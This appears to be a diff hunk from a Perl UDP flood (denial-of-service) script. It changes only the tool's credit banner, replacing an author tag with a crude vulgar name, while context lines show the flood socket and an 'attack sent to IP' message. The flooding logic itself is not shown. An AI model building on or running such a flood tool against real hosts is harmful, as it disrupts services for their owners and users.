@@ -10,7 +10,7 @@ socket(flood, PF_INET, SOCK_DGRAM, 17);
 
 use Term::ANSIColor qw(:constants);
     $Term::ANSIColor::AUTORESET = 2;
-print BOLD GREEN "Killall Made by Head#9999\n";
+print BOLD GREEN "Killall by cumming\n";
 print BOLD BLUE "Sent attack to $ip " . ($port ? $port : "random") . " with " .
 ($size ? "$size-byte" : "|53414d50|") . " " .
 ($time ? "for $time seconds" : "") . "\n";
